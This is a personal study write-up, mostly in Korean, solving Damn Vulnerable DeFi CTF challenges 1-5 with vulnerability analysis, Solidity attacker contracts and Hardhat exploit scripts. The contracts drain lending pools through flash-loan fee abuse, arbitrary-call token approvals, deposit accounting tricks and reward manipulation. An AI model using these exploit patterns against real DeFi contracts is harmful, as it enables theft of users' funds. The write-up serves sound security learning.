# Damm Vulnerable Defi

생각보다 재밌는 것 같으나 익숙치 않아 어려움. 코어팀에는 합류하고 싶어 여기저기 솔루션을 참고하여 추석 연휴에 겨우겨우 풀어나감..(그마저도 다 못함). 내공 키운 후, 망각 곡선 도달할 때 다시 풀어보기!!

# How to write a good Write-up

[Cheatsheet - How to write a good Write-up](https://pequalsnp-team.github.io/cheatsheet/writing-good-writeup)

# Introduction

I’ve participated to lot of CTFs and every time one ends I always read **good, bad and “shitty” Write-up.**

When you are writing a Write-up, keep in mind that you are not writing it for Fame and Glory (maybe also for this), but *you should write it for other users that want to learn and explore new way to think and most important,**you should write it for yourself!!*** .

Sometimes I find challenges in CTF that I’ve already completed some time ago, or at work I see problems that I’ve already solved during a CTF and going back reading those Write-up made me cringe every time.

So **I think it will be useful to write some guidelines for us (and you!) to follow when writing a write-up.**

# Step 0 - Required Information

If you are writing a Write-up for a CTF, there are some information that you ***NEED*** to include. These information are:

- **CTF name**
- **Challenge name**
- **Challenge description**
- **Challenge category** => so users know the chall’s field
- **Challenge points** => so users know the chall’s difficulty
- *CTF Year and Date* **[OPTIONAL]** => so users know if it’s outdated

# Step 1 - Content

**When writing your content don’t be too greedy.**I’ve seen some Write-up made up of a to-do list, some made of just Python/JS code with no comment whatsoever.

You have to explain the *exact sequence of thoughts* you went through to go from A to B.“I have `2`, I know that `2 + 2 = flag` so I made this script that computes `2 + 2` and I got the `flag`”Just don’t post your code without a description or some comments please.

If you used an already existing script from somewhere else, be sure to back it up. Too many times people post links to their source code that after some time result broken.

**When writing your content don’t be too verbose.**I mean, *you can*, but **(at the top) insert an abstract/summary as a** ***TL;DR*** **(at least 50 words)**

Don’t forget that if you include too many useless details you *will result boring*.So you can use some memes pic or write some jokes to keep the readers glued to the screen.

# Step 2 - Extra Points

You get *GOLDEN SHINING* Extra points if:

- You use **bold**, *italic* or ***both*** to enhance the Content’s key-point.
- You add **some screenshots**.
- You **correctly format** small code snippet, path, strings, etc.
- Your write-up is **reproducible** (You must attach the challenge source-code, sometimes this can’t be done).
- Your write-up is **multilingual** (***English is a priority. At least for TL;DRs***).

[Damn Vulnerable DeFi Challenge #1 - Unstoppable](https://stermi.medium.com/damn-vulnerable-defi-challenge-1-unstoppable-92bacdefafcc)

[Damn Vulnerable DeFi v2 - part #1: Setup and Challenges 1 to 4 * Ventral Digital](https://ventral.digital/posts/2021/11/13/damn-vulnerable-defi-v2-part-1-setup-and-challenges-1-to-4)

[Damn Vulnerable DeFi: "Naive receiver" (Level 2) - Solution](https://coinsbench.com/damn-vulnerable-defi-naive-receiver-level-2-solution-17d6a4763c7b)

# Challenge #1 - Unstoppable

### 설명

*There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.*

*If only there was a way to attack and stop the pool from offering flash loans …You start with 100 DVT tokens in balance.*

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableLender is ReentrancyGuard {
    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);

        damnValuableToken.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(
            address(damnValuableToken),
            borrowAmount
        );

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}
```

### 목표

flashloan의 기능을 마비 시키는 것이 목적

test code 상 flashloan으로 10 토큰을 빌리는데 실패하면 성공

### 분석

flashloan함수는 borrowAmount 0을 체크하지 않음.

poolBalance는 state variable로 deposit 함수로 업데이트.

### 공격

별도의 컨트랙트를 작성하지 않고 컨트랙트의 state를 변경.

require나 assert의 조건을 체크

transfer 이행 전에 `assert(poolBalance == balanceBefore);` 를 확인. 

balanceBefore는 함수 내에서 가져오지만 poolBalance는 depositTokens()에서 업데이트 된 것을 사용. transfer를 별도로 test 스크립트에서 이행하여 poolBalance 정보가 달라지게 함. 

위 `assert(poolBalance == balanceBefore);`조건에 위배되어 플래시론 수행 불가.

```solidity
it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.token.connect(attacker);
    await this.token.transfer(
      this.pool.address,
      INITIAL_ATTACKER_TOKEN_BALANCE
    );
  });
```

flashloan 수행 시 poolBalance를 다시 업데이트할 필요 있음.

# Challenge #2 - **Naive receiver**

### 설명

*There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.*

*You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.*

*Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;)*

### 목표

유저 컨트랙트의 토큰을 다 터는게 목표. 공격 컨트랙트를 작성하여 해보기.

### 분석

flashloan 함수는 receiver contract가 아니더라도 호출 가능.

flashloan 함수는 0개의 토큰도 빌릴 수 있음.

### 공격

receiver로 하여금 0개의 토큰을 빌리도록 flashloan을 반복 이행하여 수수료로 다 털어 잔고를 0으로 만들기.

테스트 스크립트에서 flashloan을 단순 반복 호출할 수 있으나 컨트랙트로 만들기를 권장했으니 해보기.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    function attack(INaiveReceiverLenderPool pool, address payable receiver)
        public
    {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

```solidity
it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const NaiveAttacker = await ethers.getContractFactory(
      "NaiveReceiverAttacker",
      attacker
    );
    this.attackerContract = await NaiveAttacker.deploy();
    await this.attackerContract.attack(
      this.pool.address,
      this.receiver.address
    );
  });
```

receiver contract의 owner체크 필요

flashloan으로 빌릴 토큰이 소진하는 토큰(수수료) 보다 같거나 많은 지 체크

# Challenge #3 - Truster

### 설명

*More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.*

*Currently the pool has 1 million DVT tokens in balance. And you have nothing.*

*But don’t worry, you might be able to take them all from the pool. In a single transaction.*

### 목표

attacker가 pool의 balance 다 가져가기

### 분석

flashloan에서 0개 토큰 체크 안함.

flashloan 실행 주체가 누구인지 확인 안함.

target에 functionCall 가능.

### 공격

공격 contract에서 0개 토큰을 빌리는 flashloan 수행.

이 때 functionCall은 approve 함수를 수행하여 pool contract의 권한 획득!

그 다음은 마음대로!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterLenderAttacker {
    IERC20 immutable dvt;
    TrusterLenderPool immutable pool;
    address immutable owner;
    uint256 immutable poolToken;

    constructor(
        address _dvtAddress,
        address _poolAddr,
        uint256 _poolToken
    ) {
        dvt = IERC20(_dvtAddress);
        pool = TrusterLenderPool(_poolAddr);
        owner = msg.sender;
        poolToken = _poolToken;
    }

    function drain() external {
        require(msg.sender == owner);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolToken
        );

        pool.flashLoan(0, owner, address(dvt), data);
        dvt.transferFrom(address(pool), owner, dvt.balanceOf(address(pool)));
    }
}
```

```solidity
it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const TrusterAttacker = await ethers.getContractFactory(
      "TrusterLenderAttacker",
      attacker
    );
    this.attackContract = await TrusterAttacker.deploy(
      this.token.address,
      this.pool.address,
      TOKENS_IN_POOL
    );
    await this.attackContract.connect(attacker).drain();
  });
```

functionCall 은 강력한 함수. 다른 contract를 call할 떄 권한 인증이 중요.

# Challenge #4 - Side entrance

### 설명

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

### 목표

pool balance 다 털기. attacker balance는 초기 값보다 높으면 됨.

### 분석

contract에서 deposit과 withdraw는 mapping된 변수를 사용하지만 flashloan 함수는 address에서 직접 가져옴.

flashloan 에는 execute가 있음.

### 공격

공격 컨트랙트에서 flashloan을 호출하고 execute를 통해 deposit 함수를 실행하게 함. 

deposit된 balance는 공격자 컨트랙트가 가짐. balances[msg.sender]

deposit은 mapping의 balance로 업데이트하고 있어 flashloan이 확인 못함.

그 다음은 그냥 가져가면 됨.

withdraw로 pool의 balance를 가져가고 transfer로 공격자에게 전송.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool immutable pool;
    uint immutable etherInPool;
    address payable immutable attacker = payable(msg.sender);

    constructor(address _pool, uint _etherInPool) {
        pool = ISideEntranceLenderPool(_pool);
        etherInPool = _etherInPool;
    }

    function pwn() external {
        pool.flashLoan(etherInPool);
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

```solidity
it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const ExploitFactory = await ethers.getContractFactory(
      "SideEntranceAttacker",
      attacker
    );
    // Run Exploit constructor.
    const exploit = await ExploitFactory.deploy(
      this.pool.address,
      ETHER_IN_POOL
    );
    await exploit.pwn();
  });
```

특정의 값을 비교할 때, state variable을 사용할 것이면 어디서 값이 변할 수 있는지 추적하고 의도하지 않은 루트는 막아야 함. 아니면 비교 시점 직전에 항상 값을 새로 읽어 비교.

withdraw() 실행 시에도 owner 확인이 필요.

# Challenge #5 - Rewarder

### 설명

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

### 목표

3라운드 시점에 4명의 참가자는 0.01 토큰보다 낮은 리워드를 받아야 함.

총 공급량은 100 토큰보다 커야 함.

attacker의 리워드 토큰은 100 근방

attacker의 유동성 토큰은 0개

### 분석

기존 4명은 각각 100개 토큰씩 예치하여 총 400개

리워드는 총 예치량 대비 개인의 예치량의 백분율로 정해짐.

100만 숫자에 400은 오차 수준.

### 공격

flashloan으로 100만개 토큰을 빌려서 reward pool에 예치. 

리워드 받아서 빌린 토큰 플래시론에 반환하고 리워드는 attacker에 전송하면 끝

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract RewarderAttacker {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    address owner;

    constructor(
        DamnValuableToken _liquidityToken,
        FlashLoanerPool _flashLoanPool,
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken
    ) {
        owner = msg.sender;
        liquidityToken = _liquidityToken;
        flashLoanPool = _flashLoanPool;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == address(flashLoanPool), "only pool");

        liquidityToken.approve(address(rewarderPool), borrowAmount);

        rewarderPool.deposit(borrowAmount);

        rewarderPool.withdraw(borrowAmount);

        bool payedBorrow = liquidityToken.transfer(
            address(flashLoanPool),
            borrowAmount
        );
        require(payedBorrow, "Borrow not payed back");

        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        bool rewardSent = rewardToken.transfer(owner, rewardBalance);

        require(rewardSent, "Reward not sent back to the contract's owner");
    }

    function attack() external {
        require(msg.sender == owner, "only owner");

        uint256 dvtPoolBalance = liquidityToken.balanceOf(
            address(flashLoanPool)
        );
        flashLoanPool.flashLoan(dvtPoolBalance);
    }
}
```

```solidity
/** CODE YOUR EXPLOIT HERE */
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
    const RewarderAttacker = await ethers.getContractFactory(
      "RewarderAttacker",
      attacker
    );
    this.rewarderAttacker = await RewarderAttacker.deploy(
      this.liquidityToken.address,
      this.flashLoanPool.address,
      this.rewarderPool.address,
      this.rewardToken.address
    );
    await this.rewarderAttacker.connect(attacker).attack();
```

유동성 풀이 작아서 벌어지는 문제. 기능은 정상적으로 동작한 것으로 보이나. 너무 극단적. 최소 보상치를 보장하거나 지나치게 큰 portion을 가지게 될 경우. log 등 특정의 capping method가 필요해 보임.

# Challenge #6 - Selfie

### 설명

A new cool lending pool has launched! It's now offering flash loans of DVT tokens.

Wow, and it even includes a really fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

### 목표

pool의 token 다 내꺼하기.

### 분석

거버넌스와 스냅샷 개념이 추가 됨.

<aside>
💡 To be continue…

</aside>

다 재밌어보이는데 실력이 부족한게 결정적이네요.. 정진하겠습니다ㅠ(코어쪽을 지향하지만 다양한 방면으로 다 잘 알고 있어야 한다고 생각해서 참여합니다!)

[Posts by Year](https://bears-team.github.io/posts/)